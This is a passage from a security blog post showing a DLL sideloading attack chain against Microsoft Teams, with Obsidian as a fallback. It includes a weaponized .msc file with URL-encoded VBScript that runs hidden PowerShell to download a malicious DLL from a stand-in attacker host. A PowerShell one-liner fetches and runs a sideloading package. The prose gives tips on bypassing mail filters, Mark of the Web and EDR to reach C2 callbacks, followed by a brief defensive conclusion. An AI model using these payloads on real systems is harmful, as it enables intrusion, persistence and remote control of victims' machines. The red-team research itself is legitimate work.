<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-10-DVTA-20240523164742.webp" width="936" height="546" alt="">
</button>
</div>
<figcaption class="caption">Figure 2: DVTA running normally with the new cryptbase.dll</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>The enc.bin file should of course be hosted on controlled web server during the attack, otherwise this POC won’t work.</p>
<p>When this newly created DLL is placed inside the <code>c:\Users\user\AppData\Local\Microsoft\Teams\current</code>\ folder, Teams will load it on next startup. And now the question is HOW to transfer it? The most obvious answer is of course from phishing attack aiming to obtain initial access and establish persistence. However, transferring a DLL file over email as attachment is not a smart thing to do and will also get blocked by the outlook client.</p>
<p>The answer to this problem is not straight forward as there are countless ways and tricks into performing this attack. Some examples may include transferring a legit signed binary with a sideloading DLL in a ZIParchive. But there are dozens of attachment types possibly being used for initial access payloads ranging from MSI/ClickOnce installer files over Scripting files (SCT, JS, …) Shortcut Files (LNK, URL, …) and much more.</p>
<p>The aim of this blog is however not to show initial access payload types, so we go for one recently published example only.</p>
<p>On 21th of June, <a title="Tweet from elastic" href="https://x.com/dez_/status/1804211936311284209" target="_blank" rel="noopener">elastic</a> published a new initial access vector for command execution via specially crafted .msc files. We could simply modify this initial PoC to execute a Powershell oneliner, which downloads out DLL from a remote webserver into the target writable <code>%APPDATA%</code> location.</p>
<div style="color: #dadada; background-color: #1e1e1e; font-family: Droid Sans Mono for Powerline, Menlo, Monaco, 'Courier New', monospace, Menlo, Monaco, 'Courier New', monospace; font-weight: normal; font-size: 12px; line-height: 18px; white-space: pre; max-width: 800px; padding-left: 8px; text-wrap: wrap;">
<div><span style="color: #808080;">XML</span><br><span style="color: #808080;">&lt;?</span><span style="color: #569cd6;">xml</span><span style="color: #9cdcfe;"> version</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">1.0</span><span style="color: #e8c9bb;">"</span><span style="color: #808080;">?&gt;</span><br><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">MMC_ConsoleFile</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">ConsoleVersion</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">3.0</span><span style="color: #e8c9bb;">"</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">ProgramMode</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">UserSDI</span><span style="color: #e8c9bb;">"</span><span style="color: #808080;">&gt;</span><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">ConsoleFileID</span><span style="color: #808080;">&gt;</span><span style="color: #dadada;">a7bf8102-12e1-4226-aa6a-2ba71f6249d0</span><span style="color: #808080;">&lt;/</span><span style="color: #569cd6;">ConsoleFileID</span><span style="color: #808080;">&gt;</span><br><br><span style="color: #dadada;">[…snip…]</span><br><br><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">StringTable</span><span style="color: #808080;">&gt;</span><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">GUID</span><span style="color: #808080;">&gt;</span><span style="color: #dadada;">{71E5B33E-1064-11D2-808F-0000F875A9CE}</span><span style="color: #808080;">&lt;/</span><span style="color: #569cd6;">GUID</span><span style="color: #808080;">&gt;</span><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">Strings</span><span style="color: #808080;">&gt;</span><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">String</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">ID</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">1</span><span style="color: #e8c9bb;">"</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">Refs</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">1</span><span style="color: #e8c9bb;">"</span><span style="color: #808080;">&gt;</span><span style="color: #dadada;">Favorites</span><span style="color: #808080;">&lt;/</span><span style="color: #569cd6;">String</span><span style="color: #808080;">&gt;</span><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">String</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">ID</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">8</span><span style="color: #e8c9bb;">"</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">Refs</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">2</span><span style="color: #e8c9bb;">"</span><span style="color: #808080;">&gt;</span><span style="color: #dadada;">// Console Root</span><br><br><span style="color: #dadada;"> // </span><span style="color: #b4b4b4;">&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><span style="color: #569cd6;">#x20</span><span style="color: #b4b4b4;">;&amp;</span><br><br><span style="color: #dadada;"> var scopeNamespace = external.Document.ScopeNamespace;</span><br><br><span style="color: #dadada;"> var rootNode = scopeNamespace.GetRoot()</span><br><br><span style="color: #dadada;"> var mainNode = scopeNamespace.GetChild(rootNode)</span><br><br><span style="color: #dadada;"> var docNode = scopeNamespace.GetNext(mainNode)</span><br><br><span style="color: #dadada;"> external.Document.ActiveView.ActiveScopeNode = docNode</span><br><br><span style="color: #dadada;"> docObject = external.Document.ActiveView.ControlObject</span><br><br><span style="color: #dadada;"> external.Document.ActiveView.ActiveScopeNode = mainNode</span><br><br><span style="color: #dadada;"> var XML = docObject;</span><br><br><span style="color: #dadada;"> XML.async = false</span><br><br><span style="color: #dadada;"> var xsl = XML;</span><br><br><span style="color: #dadada;"> xsl.loadXML(unescape("%3C%3Fxml%20version%3D%271%2E0%27%3F%3E%0D%0A%3Cstylesheet%0D%0A%20%20%20%20xmlns%3D%22 </span><span style="color: #dadada;">http%3A%2F%2Fwww%2Ew3%2Eorg%2F1999%2FXSL%2FTransform%22%20xmlns%3Ams%3D%22urn%3Aschemas%2Dmicrosoft%2Dcom%3Axslt %22%0D%0A%20%20%20%20xmlns%3Auser%3D%22placeholder%22%0D%0A%20%20%20%20version%3D%221%2E0%22%3E%0D%0A%20%20%20 %20%3Coutput%20method%3D%22text%22%2F%3E%0D%0A%20%20%20%20%3Cms%3Ascript%20implements%2Dprefix%3D%22user%22%20 language%3D%22VBScript%22%3E%0D%0A%09%3C%21%5BCDATA%5B%0D%0ASet%20wshshell%20%3D%20CreateObject%28%22WScript %2EShell%22%29%0D%0AWshshell%2Erun%20%22powershell%20-w%20hidden%20Invoke-WebRequest%20-Uri%20https%3A%2F%2Fevildomain.com%2FAudioSes.dll%20-OutFile%20%24env%3ALOCALAPPDATA%5CMicrosoft%5CTeams%5Ccurrent%5CAudioSes.dll%20-UseBasicParsing%22%0D%0A%5D%5D%3E%3C%2Fms%3Ascript%3E%0D%0A%3C%2Fstylesheet%3E"))</span><br><br><span style="color: #dadada;"> XML.transformNode(xsl)</span><br><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;/</span><span style="color: #569cd6;">String</span><span style="color: #808080;">&gt;</span><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">String</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">ID</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">23</span><span style="color: #e8c9bb;">"</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">Refs</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">2</span><span style="color: #e8c9bb;">"</span><span style="color: #808080;">&gt;</span><span style="color: #dadada;">Document</span><span style="color: #808080;">&lt;/</span><span style="color: #569cd6;">String</span><span style="color: #808080;">&gt;</span><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">String</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">ID</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">24</span><span style="color: #e8c9bb;">"</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">Refs</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">1</span><span style="color: #e8c9bb;">"</span><span style="color: #808080;">&gt;</span><span style="color: #dadada;">{2933BF90-7B36-11D2-B20E-00C04F983E60}</span><span style="color: #808080;">&lt;/</span><span style="color: #569cd6;">String</span><span style="color: #808080;">&gt;</span><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">String</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">ID</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">38</span><span style="color: #e8c9bb;">"</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">Refs</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">2</span><span style="color: #e8c9bb;">"</span><span style="color: #808080;">&gt;</span><span style="color: #dadada;">Main</span><span style="color: #808080;">&lt;/</span><span style="color: #569cd6;">String</span><span style="color: #808080;">&gt;</span><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">String</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">ID</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">39</span><span style="color: #e8c9bb;">"</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">Refs</span><span style="color: #dadada;">=</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">1</span><span style="color: #e8c9bb;">"</span><span style="color: #808080;">&gt;</span><span style="color: #dadada;">res://apds.dll/redirect.html?target=javascript:eval(external.Document.ScopeNamespace.GetRoot().Name)</span><span style="color: #808080;">&lt;/</span><span style="color: #569cd6;">String</span><span style="color: #808080;">&gt;</span><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;/</span><span style="color: #569cd6;">Strings</span><span style="color: #808080;">&gt;</span><br><span style="color: #dadada;"> </span><span style="color: #808080;">&lt;/</span><span style="color: #569cd6;">StringTable</span><span style="color: #808080;">&gt;</span><br><span style="color: #808080;">&lt;/</span><span style="color: #569cd6;">StringTables</span><span style="color: #808080;">&gt;</span><br><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">BinaryStorage</span><span style="color: #808080;">&gt;</span><br><br><span style="color: #dadada;">[…snip…]</span><br><br><br><span style="color: #808080;">&lt;</span><span style="color: #569cd6;">SNIPPED</span><span style="color: #dadada;"> CODE</span><span style="color: #808080;">&gt;</span></div>
</div>
<p>The interesting part is the execution of Powershell in the URL-encoded payload section , which downloads the DLL from a remote webserver into <code>%APPDATA%</code>.</p>
<p><em>Keep in mind that no matter which payload you use, always url encode it before action, otherwise it will simply corrupt the MSC file.</em></p>
<p>To make the things even better, the .msc payload could also be adjusted in terms of a pre-checking if Teams is running or not. If there is no Teams on the target system, we’re using an alternative payload. Let’s extend the logic a little bit now.</p>
<div style="color: #dadada; background-color: #1e1e1e; font-family: Droid Sans Mono for Powerline, Menlo, Monaco, 'Courier New', monospace, Menlo, Monaco, 'Courier New', monospace; font-weight: normal; font-size: 12px; line-height: 18px; white-space: pre; max-width: 800px; padding-left: 8px; text-wrap: wrap;">
<div><span style="color: #dadada;">Powershell </span><span style="color: #b4b4b4;">-</span><span style="color: #dadada;">w </span><span style="color: #569cd6;">hidden</span><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dcdcaa;">Get-Process</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">-</span><span style="color: #dadada;">Name Teams </span><span style="color: #b4b4b4;">-</span><span style="color: #dadada;">ErrorAction SilentlyContinue</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">curl.exe</span><span style="color: #dadada;"> https:</span><span style="color: #b4b4b4;">//</span><span style="color: #dcdcaa;">evildomain.com</span><span style="color: #b4b4b4;">/</span><span style="color: #dadada;">AudioSes.dll </span><span style="color: #b4b4b4;">-</span><span style="color: #dadada;">k </span><span style="color: #b4b4b4;">-</span><span style="color: #dadada;">o </span><span style="color: #b4b4b4;">$</span><span style="color: #9cdcfe;">env:LOCALAPPDATA</span><span style="color: #dadada;">\Microsoft\Teams\current\AudioSes.dll </span><span style="color: #b4b4b4;">}</span><span style="color: #dadada;"> </span><span style="color: #d8a0df;">else</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">curl.exe</span><span style="color: #dadada;"> https:</span><span style="color: #b4b4b4;">//</span><span style="color: #dcdcaa;">evildomain.com</span><span style="color: #b4b4b4;">/</span><span style="color: #dadada;">Obsidian.zip </span><span style="color: #b4b4b4;">-</span><span style="color: #dadada;">k </span><span style="color: #b4b4b4;">-</span><span style="color: #dadada;">o C:\Windows\Tasks\Obsidian.zip</span><span style="color: #b4b4b4;">;</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">Expand-Archive</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">-</span><span style="color: #dadada;">Path C:\Windows\Tasks\Obsidian.zip </span><span style="color: #b4b4b4;">-</span><span style="color: #dadada;">DestinationPath C:\Windows\Tasks </span><span style="color: #b4b4b4;">-</span><span style="color: #dadada;">Force</span><span style="color: #b4b4b4;">;</span><span style="color: #dadada;"> C:\Windows\Tasks\</span><span style="color: #dcdcaa;">obsidian.exe</span><span style="color: #b4b4b4;">}</span></div>
</div>
<p>In this case, the first part of the snippet will check the running processes for an Teams instance running. If so, it will simply drop the DLL, which will complete the sideloading attack and establish persistence. On the other hand side, if Teams is missing, the code will download a ZIP archive with known and signed binary, in this example – Obsidian. The archive also contains the precompiled malicious DLL with the name of <code>oleacc.dll</code>.</p>
<p><em>The oleacc.dll has the same functionality as AudioSes.dll and was generated with Spartacus, by following the same process as above.</em></p>
<p>After extraction, obsidian.exe will be executed and then the DLL will be loaded.</p>
<p>The next part is to transfer the .msc file in an archive (as plain .msc is also blocked for download by outlook) or via Phishing Link as download from a remote webserver (no Mark of the Web), and upon execution, we should be able to receive a C2 callback in each of the cases.</p>            </div>
</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<h3>Case 1: Teams</h3>
<div class="ce_text__content">
<p>Executing test.msc automatically downloads AudioSes.dll to the needed location.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20392">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-16-msc-exe-20240729113025.webp" width="945" height="238" alt="Screenshot msc execution leads to file drop &amp; persistence">
</button>
</div>
<figcaption class="caption">Figure 16: msc execution leads to file drop &amp; persistence</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>Next time teams starts, the enc.bin file is remotely fetched and C2 connection get’s established.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20448">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-17-dll-download-20240729113052.webp" width="945" height="83" alt="Screenshot DLL &amp;&amp; encrypted payload getting downloaded">
</button>
</div>
<figcaption class="caption">Figure 17: DLL &amp;&amp; encrypted payload getting downloaded</figcaption>
</figure>

</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20449">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-18-c2-connect-20240729113115.webp" width="877" height="867" alt="Screenshot C2 connection established via Teams">
</button>
</div>
<figcaption class="caption">Figure 18: C2 connection established via Teams</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<h3>Case 2: Obsidian</h3>
<div class="ce_text__content">
<p>Here, test.msc is executed when Teams is not running, which downloads and extracts Obsidian.zip into <code>C:\Windows\Tasks\</code>.</p>
<p>Using Obsidian for initial access in a real world environment would however be highly suspicious, as Obsidian won’t start in hidden mode but be visible for the target user, which might also just close the process killing your C2-connection. But this example can be replaced with any other Sideloading binary.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20451">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-19-archive-obsidian-20240729113200.webp" width="945" height="349" alt="Screenshot Archive extracted &amp;&amp; Obsidian started">
</button>
</div>
<figcaption class="caption">Figure 19: Archive extracted &amp;&amp; Obsidian started</figcaption>
</figure>

</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20452">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-20-c2-connect-obsidian-20240729113230.webp" width="880" height="917" alt="Screenshot C2 connection via Obsidian.exe">
</button>
</div>
<figcaption class="caption">Figure 20: C2 connection via Obsidian.exe</figcaption>
</figure>

</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung9">
<div class="container container__article">
<div class="row">
<div class="ce_text Kein Abstand - 0px bg-  block" id="lab">
<h2>9. Conclusion</h2>
<div class="ce_text__content">
<p>We went through explanations about DLLs in general, how the DLL Sideloading attack works and some ideas for initial access and weaponization. You may now understand what DLL Hijacking and DLL Sideloading is about and how to forward DLL exports.</p>
<p>The process of finding binaries vulnerable to DLL Sideloading, as well as weaponization of those in terms of shellcode execution with basic and minimum needed evasion was shown.</p>
<p>One of the coolest parts about sideloading is its evasive nature, especially for EDRs. Living in a legitimate signed and often used binary will lead to more trust for our process and less detections. Especially, if our target process is doing similar activities to our beacon like HTTPS communication in regular intervals, we masquerade this IoC inside of our trusted process. Using an unsigned exectable, which is not known to be used in company environments (cloud metadata) will likely already lead to an alert/detection, so sticking to at least DLLs or better Sideloading is a must nowadays.</p>
<p>Of course, the DLL payload itself should be as evasive as possible because, no matter how evasive the sideloading technique is, you cannot expect great results if you for example embed the plaintext payload into the source code, just as I did in the first demo. Once more, remember that every component of your attack chain needs to be taken care of because the attack likely fails if just one of them is not.</p>
<p>As defenders, it's crucial to adopt a multi-layered approach to mitigate this risk effectively.</p>
<p>One of the primary strategies involves implementing Application Whitelisting to ensure only approved binaries can execute. By tightly controlling what runs in your environment, you significantly reduce the attack surface.</p>
<p>Custom detection rules for known Windows DLLs being loaded from non Windows path’s such as System32 could also be used to identify DLL Sideloading attacks. Doing this for non Windows DLLs however is not that easy, as there are too many different vendors and binaries/DLLs to track all of them.</p>
<p>It is imperative to prioritize user awareness and education. After all, the MSC file from this blogpost must be first delivered to the victim system before it is executed. When paired with strong endpoint security solutions, the chances to identify and stop malicious activities are higher.</p>            </div>
</div>
</div>
</div>
</div>
</div>
</main>
</div>

</div>






</body></html>